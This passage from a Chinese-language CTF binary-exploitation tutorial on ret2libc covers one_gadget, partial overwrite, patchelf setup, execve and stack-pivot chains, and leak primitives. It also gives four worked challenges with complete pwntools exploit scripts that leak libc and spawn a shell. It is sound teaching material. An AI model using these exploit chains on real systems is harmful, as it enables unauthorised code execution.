og = libc_base + 0x45216           # one_gadget 工具输出（glibc 2.23 首选候选）

# ---------- 第二轮：直接 ret 到 one_gadget ----------
payload2  = b'b' * offset
payload2 += p64(og)                # 返回地址 = one_gadget
payload2 += p64(0) * 8             # 补 0：让 [rsp+0x30]（对应 0x30~0x70 各候选）必然为 NULL
io.sendafter(b'input:\n', payload2)

io.interactive()
```

> 补 0 的原理：`ret` 弹走 og 槽位后 rsp 恰好指向紧随其后的我们写入的 0 区，rsp+0x30 落在 0 区内 → 约束必然满足。前提是溢出空间足够长（本例 `read(0, buf, 0x200)`）；空间不足时只能靠 gdb 现场验证或换候选。

---
## 5.6 部分覆盖（partial overwrite）

### 5.6.1 原理：页对齐 ⇒ 低位已知

libc 基址按页（0x1000）对齐，低 12 位恒为 0。于是对一个已存在的 libc 指针（GOT 条目、栈上返回地址）做**只写低位**的修改：

```text
原地址 = 基址 + 原偏移        目标地址 = 基址 + 目标偏移
两者低 12 位都已知且固定（= 各自偏移的低 12 位）
第 12~15 位：随基址随机（4 位）    第 16 位以上：被保留的部分原样继承
```

| 覆盖长度 | 覆盖的位 | 未知的随机位 | 命中指定目标的概率 | 说明 |
| -------- | -------- | ------------ | ------------------ | ---- |
| 低 1 字节 | bit0~7 | 0 | 100%（确定性） | 只能在同 256 字节窗口内改变控制流 |
| 低 2 字节 | bit0~15 | 4 | 1/16 | 最常用 |
| 低 3 字节 | bit0~23 | 12 | 1/4096 | 跨 64K 窗口时用 |

**重要前提**：做低 2 字节覆盖时，目标与被改地址的**第 16 位以上必须完全一致**（即两个偏移的高 16 位相同、不跨 64K 窗口），否则无论怎么爆破都打不中。选目标前先比较：

```python
if (target_off >> 16) == (orig_off >> 16):
    # 可 2 字节覆盖，1/16
else:
    # 退而求其次：3 字节覆盖，1/4096（保留 bit24 以上即可，libc 总体积 < 16MB 时通常成立）
```

### 5.6.2 应用一：返回地址部分覆盖 → one_gadget

场景：溢出长度紧张、或完全没有泄露通道，但栈上已有一个指向 libc 的返回地址（如 main 的返回地址指向 `__libc_start_main+X`）。

```python
# 判断 one_gadget 偏移与原返回地址偏移是否同窗
orig_off = 0x21ba3                 # __libc_start_main + X（gdb 实测）
og_off   = 0x45216                 # one_gadget 输出
# (orig_off >> 16) == 0x2, (og_off >> 16) == 0x4 → 不同窗 → 需 3 字节覆盖

payload = b'a' * offset + p24(og_off & 0xffffff)   # 只写低 3 字节，bit24 以上保留原值
io.send(payload)                    # 必须用 read/write 型原语精确发送 offset+3 字节
# 期望 1/4096 命中；程序可循环/可重连时反复尝试
```

若同窗则写 `p16(og_off & 0xffff)`，1/16。

注意：**`gets`/`scanf` 类输入会补 `\x00` 或处理空白，破坏"只写 N 字节"的前提**——部分覆盖要求 `read`/`write` 型原语（或格式化字符串 `%hhn`/`%hn`，见 08 章）。

### 5.6.3 应用二：GOT 部分覆盖

前提：某个 GOT 条目已解析（存着 libc 真实地址），且目标函数偏移与它**同窗**。用格式化字符串 `%hn`（08 章）只改低 2 字节：

```python
# 例：puts@got 已解析，目标函数 T 与 puts 偏移高 16 位相同
writes  = {puts_got: libc_offset_of_T & 0xffff}            # 只写低 16 位
payload = fmtstr_payload(fmt_offset, writes, write_size='short')
io.send(payload)
# 之后程序里任何 puts("...") 都会跳到 T；若能控制 puts 的参数为 "sh" → system("sh") → shell
```

成功率分析：写入的是 `T偏移 & 0xffff`（bit0~11 本来就正确，bit12~15 赌基址随机位），命中真实 `基址+T偏移` 的概率约 1/16，还受两偏移跨窗进位影响——总之先做 5.6.2 开头的高位比对再动手。

### 5.6.4 与随机化的关系与注意事项

- ASLR 的熵集中在高位（x64 mmap 基址约 28 位熵）；部分覆盖把赌博范围从"整个地址"压缩到 4 位或 12 位，使爆破从不可能变成可行（期望 16 次 / 4096 次触发）。
- 题目若给出**可循环触发漏洞的流程**（菜单循环、while(1) accept），1/16 几乎必成；每次失败要能优雅回落（不能一崩连接就死）。
- 部分覆盖与 5.3 的低 12 位识别是同一原理的两个应用：一个用来"读"（识别版本），一个用来"写"（少打几个字节）。

---

## 5.7 题目给了 libc 文件

### 5.7.1 直接用 ELF 算偏移

```python
libc = ELF('./libc.so.6')
libc.sym['system']                        # 偏移
next(libc.search(b'/bin/sh\x00'))         # "/bin/sh" 偏移
libc_base = leak - libc.sym['puts']
```

先确认版本：

```bash
file libc.so.6
strings libc.so.6 | grep "GNU C Library"   # 例：Ubuntu GLIBC 2.31-0ubuntu9.16
```

### 5.7.2 patchelf 本地复现（标准流程）

```bash
sudo apt install patchelf
cp pwn pwn.bak                            # 先备份，patchelf 不可逆

ldd ./pwn                                 # 查看当前解释器与 libc
readelf -l ./pwn | grep interpreter

# ① 替换解释器为题目配套 ld（版本必须与 libc 匹配！）
patchelf --set-interpreter $(pwd)/ld-2.31.so ./pwn
# ② 替换 libc 依赖
patchelf --replace-needed libc.so.6 $(pwd)/libc.so.6 ./pwn

ldd ./pwn                                 # 验证：应指向你指定的 ld 与 libc
```

三个坑：

1. `--set-interpreter` 用**绝对路径**（`$(pwd)/` 展开后就是绝对路径）；
2. **ld 与 libc 必须同版本同发行版**，混搭直接段错误，连 main 都进不去；
3. patch 改的是文件本体，覆盖原文件前先备份。

### 5.7.3 题目只给 libc 不给 ld：glibc-all-in-one

```bash
git clone https://github.com/matrix1001/glibc-all-in-one
cd glibc-all-in-one && ./update_list
cat list            # 常见版本列表（老版本看 list_old / list-ubuntu）
./download 2.31-0ubuntu9.16_amd64        # 下载后会解压出 ld-2.31.so 与 libc.so.6
./download_old 2.27-b1e3fa9f5f_amd64     # 老版本用 download_old
```

用下载出的配套 ld + 题目 libc 走 5.7.2 流程。或用 `libc-database ./get` 下载（5.3.3）。

### 5.7.4 LD_PRELOAD（快速验证用）

```bash
LD_PRELOAD=$(pwd)/libc.so.6 ./pwn
```

原理：预加载库的符号优先于默认搜索路径。但**解释器仍是系统的**，题目 libc 与系统 ld 版本差距大时直接崩。仅适合"版本接近、快速验证偏移"的场景，正式复现一律 patchelf。

---

## 5.8 execve 代替 system

### 5.8.1 system 与 execve 的区别

| 对比项 | system | execve |
| ------ | ------ | ------ |
| 本质 | libc 封装：`fork` + `execve("/bin/sh", ["sh","-c",cmd], environ)` + waitpid | `execve` 系统调用的薄封装 |
| 参数 | 1 个：命令字符串 | 3 个：path、argv[]、envp[] |
| 返回行为 | 子进程执行，父进程等待，**返回后可继续 ROP** | 成功则**进程映像被替换，不返回** |
| 栈对齐 | 内部用 SSE（movaps），有 16 字节对齐要求 | 无此问题 |
| 环境依赖 | 受环境变量、SIGCHLD 影响；命令可用管道/转义 | 干净直接，`/bin/sh` + 两个 NULL 即可 |
| gadget 需求 | 64 位只需控制 rdi | 64 位需 rdi、rsi、rdx 三个寄存器（rdx 较难找） |

什么时候选 execve：① 手上有成套 pop gadget；② system 反复因对齐/环境问题失败；③ one_gadget 约束全不满足时，手动版 one_gadget。

### 5.8.2 64 位 execve 链

```bash
ROPgadget --binary libc.so.6 | grep ': pop rsi ; ret'
ROPgadget --binary libc.so.6 | grep ': pop rdx ; ret'   # 2.29+ 常缺失，可找 'pop rdx ; pop rbx ; ret'
```

```python
chain  = p64(pop_rdi) + p64(binsh)       # path = "/bin/sh"
chain += p64(pop_rsi) + p64(0)           # argv = NULL
chain += p64(pop_rdx) + p64(0)           # envp = NULL
chain += p64(libc_base + libc.sym['execve'])
```

更纯粹的写法是不借 libc 封装、直接系统调用：`pop rax` 置 59（0x3b）+ `syscall`，32 位为 `eax=0x0b` + `int 0x80`——那就是 ret2syscall 的领域，见 [04-ret2syscall.md](04-ret2syscall.md)。

### 5.8.3 32 位 execve 链

```python
# cdecl：参数压栈
chain = p32(execve_addr) + p32(0xdeadbeef) + p32(binsh) + p32(0) + p32(0)
#        调用目标           假返回地址         path       argv=NULL  envp=NULL
```

---

## 5.9 变体与扩展

### 5.9.1 栈空间不够放两条链 → 栈迁移（详见 07 章）

溢出长度只够第一轮 leak、或连一条链都放不下时，把 rsp 迁到 bss 等可控区域重新布置长链。最小可用套路（64 位）：

```python
bss = elf.bss() + 0x800
# 第一轮：控制 rbp → bss，把二段链读进 bss，再 leave;ret 迁过去
payload  = b'a' * offset
payload += p64(pop_rbp) + p64(bss)                     # rbp = bss
payload += p64(pop_rdi) + p64(0)                       # read(0, bss, 0x200)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(elf.plt['read'])
payload += p64(leave_ret)                              # leave: rsp=rbp=bss; pop rbp; ret
io.send(payload)
# 第二轮（同一连接、第二次输入）：发往 bss 的真正长链
io.send(p64(0xdeadbeef) + p64(pop_rdi) + p64(binsh) + p64(ret_g) + p64(system))
```

### 5.9.2 一次溢出完成 leak + 执行

严格意义上"先 leak 再用 leak 结果"无法在同一 payload 内完成（payload 写死时泄露值未知）。实战中的三种现实形态：

1. **一次连接两段输入（最常用）**：leak 后返回 `main`/`vuln`，紧接着发第二轮——5.4 模板本质就是它，无需重连；
2. **libc 已知时的"同链 leak + 执行"**：题目给 libc 时无需真泄露，链里可以 `puts(puts@got)` 打一份做记录/对拍，随后直接接 `system` 或 one_gadget：

```python
payload  = b'a' * offset
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])  # leak 留证
payload += p64(ret_g) + p64(pop_rdi) + p64(binsh) + p64(system)        # 已知 base，直接执行
```

3. **真·一次输入**：只能走不依赖泄露值的技术——部分覆盖（5.6）、ret2dlresolve（06 章）、SROP/ret2csu（07 章）。

### 5.9.3 environ 泄露栈地址

libc 全局变量 `environ` 存着**栈上环境变量数组的指针**。有了 libc_base 后即可把它读出来，从而获得栈地址（进而定位 canary、返回地址、精确往栈上放数据）：

```python
environ_ptr = libc_base + libc.sym['environ']        # 变量本身的地址（libc 里）

# 用 write(1, environ_ptr, 8) 读出指针的值：
payload  = b'a' * offset
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(environ_ptr) + p64(0)
payload += p64(pop_rdx) + p64(8)
payload += p64(elf.plt['write']) + p64(elf.sym['main'])
io.sendline(payload)

env_area = u64(io.recv(8))                           # ← 栈地址！环境变量数组位置
# env_area 下方（地址更高）是 argv/envp 字符串区，上方（地址更低）数十~数百字节就是 main 栈帧。
# 本地用 gdb 量出 env_area 与目标（canary/返回地址）的固定差值；远程环境不同需实测微调。
# 拿到栈地址后可再 puts(env_area - delta) 逐段 dump 栈内容，定位 canary、已泄的 libc 指针等。
```

### 5.9.4 ret2libc 打 printf 泄露

除了 5.2.3 的 `printf("%s", got)`，printf 还能当"万能输出"用：rdi 指向可控内存里预置的格式串（先 `read` 写入 bss），rsi/rdx 塞要泄的地址，实现任意读：

```python
bss = elf.bss() + 0x500
# 第一步：read(0, bss, 8) 写入 "%s\0"
# 第二步：printf(bss, puts_got)
payload  = b'a' * offset
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(pop_rdx) + p64(8)
payload += p64(elf.plt['read'])
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi_r15) + p64(elf.got['puts']) + p64(0)
payload += p64(elf.plt['printf']) + p64(elf.sym['main'])
io.send(payload); io.send(b'%s\x00')
leak = u64(io.recv(6))
```

配合 `%k$p` 还能从栈上读 `__libc_start_main` 返回地址（5.2.4）与 canary——详见 [08-格式化字符串漏洞.md](08-格式化字符串漏洞.md)。

### 5.9.5 无 puts/write 可用时的替代泄露原语

| 原语 | 调用形态 | 32 位 | 64 位要点 |
| ---- | -------- | ----- | --------- |
| `send@plt` | `send(4, buf, n, 0)` | 4 参压栈，最顺 | rdi/rsi/rdx/rcx 四个寄存器；rcx 常无纯 pop gadget，可配合 ret2csu（07 章） |
| `fwrite@plt` | `fwrite(buf, 1, 8, stdout)` | 4 参压栈 | rcx = stdout 的 FILE* 指针**变量地址**（bss 或 libc 里），不是 FILE 结构本身 |
| `fputs@plt` | `fputs(buf, stdout)` | 2 参压栈 | rdi=buf、rsi=stdout 变量地址——gadget 需求最小，优先考虑 |
| `dprintf@plt` | `dprintf(1, "%s", got)` | 3 参压栈 | 相当于输出到 fd 的 printf |
| `printf@plt` | 见 5.9.4 | - | 需要现成或预置的 "%s" |
| syscall 直接写 | `rax=1; rdi=1; rsi=got; rdx=8; syscall` | `rax=4; int 0x80` | 不依赖任何 libc 输出函数封装（04 章路线） |

**"puts 打 bss"**：bss 里常驻 `stdin/stdout/stderr` 的 FILE* 指针（copy 重定位，运行时指向 libc 的 `_IO_2_1_stdout_` 等）。对它们的地址调用 puts 同样能泄出 libc 地址：

```python
stdout_ptr = elf.sym['stdout']            # bss 中 stdout 指针变量的地址（有符号时）
payload += p64(pop_rdi) + p64(stdout_ptr) + p64(elf.plt['puts']) + p64(elf.sym['main'])
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.sym['_IO_2_1_stdout_']       # 注意：符号是 _IO_2_1_stdout_
```

若程序**连一个输出函数都没有**：退到部分覆盖（5.6）、崩溃 oracle 逐字节爆破（以崩溃与否为反馈）、ret2dlresolve（06 章）或 ret2syscall（04 章）。

---
## 5.10 典型例题

### 例题 1：64 位经典两段式（ciscn_2019_c_1 风格，BUUCTF）

**题目信息**：64 位动态链接，Ubuntu 18.04（glibc 2.27），不提供 libc 文件。

**伪 C 代码**：

```c
int encrypt_func(char *s) {
    if (strlen(s)) {                              // ★ 关键：空串直接跳过加密
        for (int i = 0; i < strlen(s); i++) {
            if (小写字母) s[i] = (s[i]-'a'+3) % 26 + 'a';   // 轮换 +3
            if (大写字母) s[i] = (s[i]-'A'+3) % 26 + 'A';
            if (数字)     s[i] = (s[i]-'0'+3) % 10 + '0';
        }
    }
}
int encrypt() {
    char buf[0x50];                               // [rbp-0x50]
    puts("Input your Plaintext to be encrypted");
    gets(buf);                                    // ★ 漏洞：无界输入
    encrypt_func(buf);                            // 先"加密"
    puts(buf);                                    // 再回显
    return 0;
}
int main() {
    while (1) { 打印菜单; 读选项; if (选1) encrypt(); else 退出; }
}
```

**checksec**：

```text
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

判定：NX 开、无后门、动态链接 → ret2libc。

**解题流程（含偏移手算）**：

1. **偏移**：IDA 显示 `buf` 位于 `[rbp-0x50]`，64 位返回地址还要跨过保存的 rbp：
   `offset = 0x50 + 8 = 88` 字节。
2. **绕过加密**：padding 全用 `\x00`。`gets` 不因 `\x00` 停止，但加密函数开头 `strlen(s)` 返回 0 → 整个变换被跳过，payload 原样落栈。
3. **找 gadget**：`ROPgadget --binary ciscn_2019_c_1 | grep "pop rdi"` 得 `0x400c83 : pop rdi ; ret`（以实际扫描结果为准）。
4. **第一轮**：`puts(puts@got)` 泄露后返回 main。
5. **定版本**：泄露值末 3 位十六进制应为 `9c0`（2.27 的 puts 偏移 0x809c0 低 12 位），LibcSearcher/blukat 确认 glibc 2.27。
6. **第二轮**：垫 `ret` 对齐后 `system("/bin/sh")`。

**完整 exp**：

```python
from pwn import *
from LibcSearcher import LibcSearcher

context.arch = 'amd64'
context.log_level = 'info'

# io = process('./ciscn_2019_c_1')
io  = remote('node4.buuoj.cn', 26991)      # 换成你的靶机
elf = ELF('./ciscn_2019_c_1')

pop_rdi = 0x400c83        # ROPgadget 扫描结果（以手上的二进制为准）
ret_g   = 0x4006b9        # 任意纯 ret，第二轮对齐用（同上）
main    = elf.sym['main']
offset  = 0x50 + 8        # 手算：0x50(buf) + 8(saved rbp) = 88

def one_round(payload):
    io.sendlineafter(b'Exit\n', b'1')     # 菜单选 1（分隔串按实际菜单文本调整）
    io.recvuntil(b'be encrypted\n')       # 等到 "Input your Plaintext..." 提示
    io.sendline(payload)

# ---------- 第一轮：leak ----------
payload1  = b'\x00' * offset              # \x00 填充 → strlen==0 → 加密函数整体跳过
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])          # rdi = puts@got
payload1 += p64(elf.plt['puts'])          # puts(rdi)：打印 libc 中 puts 真实地址
payload1 += p64(main)                     # 回 main 等第二轮

one_round(payload1)
io.recvline()                             # 吃掉 puts(buf) 的空回显行（buf 以 \x00 开头）
leak = u64(io.recvline().strip().ljust(8, b'\x00'))   # 这一行才是泄露的地址
log.success('puts@libc = %#x', leak)
assert leak & 0xfff == 0x9c0              # 自检（版本不符时先摘掉这行）

lc        = LibcSearcher('puts', leak)    # 多候选时逐个试
libc_base = leak - lc.dump('puts')
system    = libc_base + lc.dump('system')
binsh     = libc_base + lc.dump('str_bin_sh')
log.success('libc_base = %#x', libc_base)
assert libc_base & 0xfff == 0

# ---------- 第二轮：getshell ----------
payload2  = b'\x00' * offset              # 同样 \x00 绕加密
payload2 += p64(ret_g)                    # 垫 ret：16 字节对齐，防 movaps 崩溃
payload2 += p64(pop_rdi)
payload2 += p64(binsh)                    # rdi = "/bin/sh"
payload2 += p64(system)

one_round(payload2)
io.interactive()
```

**复盘**：① `\x00` 填充利用 `strlen` 短路绕过输入变换，是"变形输入"类题的通用思路（若 padding 不能全 0，则需检查 payload 是否含 `[0-9A-Za-z]` 字节并换 gadget）；② 输出多（菜单/回显/泄露），必须 `recvuntil` 精确定界，见 5.11 坑 1。

### 例题 2：32 位 write 泄露题

**题目信息**：32 位动态链接，Ubuntu 16.04（glibc 2.23 i386），不提供 libc 文件；程序只有 `read/write` 的 PLT，无 puts、无 system、无 "/bin/sh"。

**伪 C 代码**：

```c
// gcc -m32 -no-pie -fno-stack-protector pwn.c -o pwn
void vuln() {
    char buf[0x88];                // [rbp-0x88]
    puts? 没有——用 write 打印提示
    write(1, "No system for you!\n", 18);
    read(0, buf, 0x180);           // ★ 漏洞：0x180 > 0x88，可溢出 0xF8 字节
}
int main() {
    setvbuf(stdout, 0, 2, 0);
    write(1, "Welcome\n", 8);
    vuln();
    return 0;
}
```

**checksec**：

```text
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

**解题流程（含偏移手算）**：

1. **偏移**：IDA 显示 `buf` 位于 `[rbp-0x88]` → 32 位 `offset = 0x88 + 4 = 140` 字节（+4 是保存的 ebp）。
2. **泄露原语选择**：没有 puts → 用 `write(1, write@got, 4)`；write 不截断、不补 \n，收 4 字节即可。泄露 `write` 自己的 GOT——`write` 在 main/vuln 里被调用过，GOT 必已解析。
3. **第一轮**：write 泄露 + 假返回地址填 `vuln`，回 vuln 再 read 一轮。
4. **算 base**：`LibcSearcher('write', leak)`；32 位 libc 地址形如 0xf7xxxxxx。
5. **第二轮**：`system("/bin/sh")`，32 位无需对齐垫片。

**栈图**（第一轮）：

```text
低地址
+------------------+
|    'a'*140       |   填充至返回地址
+------------------+
|    write@plt     |   ← 返回地址：执行 write
+------------------+
|    vuln 地址     |   ← write 的假返回地址：打完回 vuln 再 read
+------------------+
|        1         |   ← 参数1：fd = stdout
+------------------+
|    write@got     |   ← 参数2：要泄露的地址
+------------------+
|        4         |   ← 参数3：count
+------------------+
高地址
```

**完整 exp**：

```python
from pwn import *
from LibcSearcher import LibcSearcher

context.arch = 'i386'
context.log_level = 'info'

io  = process('./pwn32')      # 远程改 remote(...)
elf = ELF('./pwn32')

write_plt = elf.plt['write']
write_got = elf.got['write']
vuln      = elf.sym['vuln']
offset    = 0x88 + 4          # 手算：0x88(buf) + 4(saved ebp) = 140

# ---------- 第一轮：write 泄露 ----------
payload1  = b'a' * offset
payload1 += p32(write_plt)    # 返回到 write
payload1 += p32(vuln)         # write 的假返回地址：回 vuln 再来一轮
payload1 += p32(1)            # fd
payload1 += p32(write_got)    # buf
payload1 += p32(4)            # count：32 位地址原样 4 字节

io.sendlineafter(b'Welcome\n', payload1)
leak = u32(io.recv(4))        # write 无换行：精确收 4 字节
log.success('write@libc = %#x', leak)
assert leak >> 28 == 0xf      # 32 位 libc 地址通常 0xf7xxxxxx，粗检

lc        = LibcSearcher('write', leak)
libc_base = leak - lc.dump('write')
assert libc_base & 0xfff == 0
system    = libc_base + lc.dump('system')
binsh     = libc_base + lc.dump('str_bin_sh')

# ---------- 第二轮：getshell ----------
payload2  = b'a' * offset
payload2 += p32(system)       # 返回到 system
payload2 += p32(0xdeadbeef)   # system 的假返回地址：占位
payload2 += p32(binsh)        # 参数："/bin/sh"

io.sendlineafter(b'No system for you!\n', payload2)   # vuln 又打了一遍提示
io.interactive()
```

**复盘**：32 位 cdecl 全程不需要 gadget，链就是"函数 + 假返回地址 + 参数表"；泄露用 write 时**接收是 `recv(4)`/`recv(8)`，别用 recvline**（它不补 \n，recvline 会一直等）。

### 例题 3：one_gadget 直取（64 位，glibc 2.23）

**题目信息**：64 位动态链接，Ubuntu 16.04（glibc 2.23），不提供 libc；溢出空间充裕。

**伪 C 代码**：

```c
void vuln() {
    char buf[0x40];          // [rbp-0x40]
    write(1, "input:\n", 7);
    read(0, buf, 0x200);     // ★ 漏洞：可溢出 0x1C0 字节（空间充裕）
}
int main() { vuln(); return 0; }
```

**checksec**：NX enabled、No canary、No PIE、Partial RELRO、动态链接。

**解题流程（含偏移手算）**：

1. **偏移**：`buf` 位于 `[rbp-0x40]` → `offset = 0x40 + 8 = 72`。
2. **第一轮 leak**：程序有 `write` 无 puts？本题假设两者都有，用 puts 更省 gadget；泄露 puts 后回 main（main 会再进 vuln）。
3. **one_gadget**：`one_gadget ./libc.so.6` 对该 2.23 输出 `0x45216`（约束 `[rsp+0x30] == NULL`）等候选。
4. **gdb 验证**（5.5.4 流程）：第二轮 payload 里 og 后接 8 个 `p64(0)`，ret 进 og 时 rsp 指向 0 区，`x/8gx $rsp+0x30` 全 0 → 约束必然满足。
5. **第二轮**：直接返回 one_gadget，省去 pop_rdi/binsh/对齐三件套。

**完整 exp**：

```python
from pwn import *
from LibcSearcher import LibcSearcher

context.arch = 'amd64'
context.log_level = 'info'

io  = process('./pwn')
elf = ELF('./pwn')

pop_rdi = 0x400763            # ROPgadget 扫描结果
offset  = 0x40 + 8            # 手算：0x40(buf) + 8(saved rbp) = 72

# ---------- 第一轮：leak ----------
payload1  = b'a' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.sym['main'])
io.sendafter(b'input:\n', payload1)

leak = u64(io.recvline().strip().ljust(8, b'\x00'))
lc        = LibcSearcher('puts', leak)
libc_base = leak - lc.dump('puts')
assert libc_base & 0xfff == 0
log.success('libc_base = %#x', libc_base)

og = libc_base + 0x45216      # one_gadget 输出（该 libc 首选候选，以实际输出为准）

# ---------- 第二轮：直接返回 one_gadget ----------
payload2  = b'b' * offset
payload2 += p64(og)           # 返回地址 = one_gadget
payload2 += p64(0) * 8        # 补 0：og 入口 rsp 指向这里，[rsp+0x30] 必为 NULL
io.sendafter(b'input:\n', payload2)

io.interactive()
```

**复盘**：one_gadget 的价值在"链短"；补 0 技巧（og 后接 `p64(0)*8`）把约束从"赌栈上残留"变成"必然成立"——但需要溢出空间允许你写到 rsp+0x30 以上。若本题 `read` 只允许 0x60 字节，补 0 写不到位，就要靠 gdb 现场验证或改两段式。

### 例题 4：题目自带 libc 文件（patchelf + 精确偏移）

**题目信息**：附件三个文件 `pwn`、`libc.so.6`、`ld-2.31.so`；64 位动态链接，Ubuntu 20.04（glibc 2.31）。

**伪 C 代码**：

```c
void vuln() {
    char buf[0x60];          // [rbp-0x60]
    write(1, ">> ", 3);
    read(0, buf, 0xF0);      // ★ 漏洞：溢出 0x90 字节
    write(1, buf, 0x20);     // 回显（内容无秘密）
}
int main() { setvbuf(...); vuln(); return 0; }
```

**checksec**：NX enabled、No canary、No PIE、Partial RELRO。

**解题流程**：

1. **确认版本**：`strings libc.so.6 | grep "GNU C Library"` → `Ubuntu GLIBC 2.31-0ubuntu9.x`。
2. **本地复现**（5.7.2）：

```bash
cp pwn pwn.bak
patchelf --set-interpreter $(pwd)/ld-2.31.so ./pwn
patchelf --replace-needed libc.so.6 $(pwd)/libc.so.6 ./pwn
ldd ./pwn     # 确认指向题目 libc
```

3. **偏移手算**：`buf` 位于 `[rbp-0x60]` → `offset = 0x60 + 8 = 104`。
4. **偏移直接来自题目 libc**：`ELF('libc.so.6').sym['puts']`——无需 LibcSearcher，精确无歧义；2.31 的 system 同样有 movaps 对齐问题，垫 ret。
5. **第二轮**：`system("/bin/sh")`。

**完整 exp**：

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

io   = process('./pwn')           # 已 patchelf；远程 remote(...)
elf  = ELF('./pwn')
libc = ELF('./libc.so.6')         # ★ 题目给的 libc，偏移以它为准

pop_rdi = 0x40124b                # ROPgadget --binary pwn | grep ': pop rdi ; ret'
ret_g   = 0x40101a                # 纯 ret
offset  = 0x60 + 8                # 手算：0x60(buf) + 8(saved rbp) = 104

# ---------- 第一轮：leak ----------
payload1  = b'a' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.sym['main'])
io.sendafter(b'>> ', payload1)

leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.sym['puts']             # 直接用题目 libc 的偏移
log.success('libc_base = %#x', libc_base)
assert libc_base & 0xfff == 0
assert (leak & 0xfff) == (libc.sym['puts'] & 0xfff)   # 双重校验版本匹配

binsh  = libc_base + next(libc.search(b'/bin/sh\x00'))
system = libc_base + libc.sym['system']

# ---------- 第二轮：getshell ----------
payload2  = b'a' * offset
payload2 += p64(ret_g)            # 2.31 对齐垫片
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)
io.sendafter(b'>> ', payload2)

io.interactive()
```

**复盘**：给 libc 的题最省心——偏移全部本地可得，还能 patchelf 精确复现；重点检查"本地跑的程序真的用了题目 libc"（ldd 确认），否则调试现象与远程不一致。

---

## 5.11 常见坑

1. **puts 泄露后 recvline 没收全 / 多吃**：题目输出多（菜单、回显、提示），泄露行前还有别的行。现象：leak 算出怪值、base 低 12 位非 0。对策：`context.log_level='debug'` 对照原始流，`recvuntil(定界串)` 精确定位；例题 1 中回显空行必须先吃掉。
2. **本地远程 libc 不一致**：本地全通、远程段错误/无反应。对策：低 12 位比对（`leak & 0xfff` vs `libc.sym[...] & 0xfff`）；用题目 libc + patchelf 复现；没有 libc 文件时以 libc-database 低 12 位结果为准，别想当然用本地版本。
3. **泄露值接收处理**：puts 泄露 6 字节要 `ljust(8, b'\x00')` 补齐；`.strip()` 会把地址尾部恰好为 0x20（空格）的字节也去掉——更稳的写法是 `io.recvline()[:-1]`；write 泄露无换行，用 `recv(4)/recv(8)` 而非 recvline；32 位用 u32、64 位用 u64。
4. **二次溢出偏移不同**：返回点不同（回 main 与回 vuln 的栈布局不同）、或两轮走的输入函数不同 → 偏移可能变化。每轮单独用 cyclic/IDA 确认，别想当然复用。
5. **栈未对齐崩溃**：64 位调 system 崩在 `do_system` 的 `movaps`。对策：垫一条纯 `ret`。注意第一轮能跑、第二轮崩（或反之）是常态——两轮 rsp 落点奇偶不同。
6. **"/bin/sh" 参数缺失/写错**：忘了 pop_rdi（64 位）、参数与假返回地址顺序颠倒（32 位是 `[system][假返回][参数]`）、把 GOT/PLT 地址当字符串地址传。自查：gdb 里 `si` 跟进 system 前看 rdi。
7. **PLT 与 GOT 混淆**：**调用用 PLT（代码桩地址），泄露用 GOT（数据表条目地址）**。泄露 GOT 时拿到的是"该函数的 libc 真实地址"；错传 PLT 地址给 puts 泄露，得到的只是自己程序的地址，算 base 必错。
8. **GOT 条目未解析**：Partial RELRO 下首次调用前 GOT 存的是 `plt+6`。选泄露目标必须是主流程调用过的函数；若唯一候选没被调过，先想办法触发一次（或换 5.9.5 的其他原语）。

---

## 5.12 本章检查清单

赛前/做题时逐项打勾：

- [ ] checksec：NX 开启 + 动态链接 + 无后门 → 确认走 ret2libc；有 canary/PIE 先记录应对方案
- [ ] 定位溢出偏移（IDA buf 位置手算：64 位 `X+8`，32 位 `X+4`；cyclic 复核）
- [ ] `ROPgadget` 找到 `pop rdi; ret`（64 位）与一条纯 `ret`（对齐备用）
- [ ] 选定泄露原语（puts/write/printf/栈残留）与 GOT 目标（确认已解析、低字节非 0）
- [ ] 第一轮链：leak + 返回 main/vuln；发送前想清每一步输出，配好 recvuntil
- [ ] 接收代码：u64/u32 + ljust 补零 + `[ :-1]` 去 \n；打印 hex 确认形如 0x7f.../0xf7...
- [ ] 算 base 并断言 `base & 0xfff == 0`；低 12 位与 libc.sym 比对确认版本
- [ ] 确定 system（或 execve/one_gadget）与 "/bin/sh" 地址；one_gadget 跑一遍工具并 gdb 验证约束
- [ ] 第二轮链：64 位记得垫 ret 对齐；32 位检查 `[system][假返回][参数]` 顺序
- [ ] 本地打通 → 与远程核对 libc（低 12 位/patchelf）→ 远程拿 shell
- [ ] 失败排查顺序：收发流（debug 日志）→ 偏移 → 对齐 → libc 版本 → 参数/寄存器

## 相关阅读

- [04-ret2syscall.md](04-ret2syscall.md) —— 不依赖 libc 函数封装，纯系统调用构造 execve/int 0x80
- [06-ret2plt与ret2dlresolve.md](06-ret2plt与ret2dlresolve.md) —— 无泄露通道时的替代路线（dlresolve 直接解析任意符号）
- [07-ROP高级技巧.md](07-ROP高级技巧.md) —— 栈迁移、ret2csu（解决 rdx/rcx 传参）、gadget 搜索进阶
- [08-格式化字符串漏洞.md](08-格式化字符串漏洞.md) —— printf 泄露/任意读/任意写（%hn 部分覆盖的执行手段）
- [99-C语言函数手册.md](99-C语言函数手册.md) —— system/execve/puts/write 函数语义细节
- [README.md](README.md) —— 返回总览导航
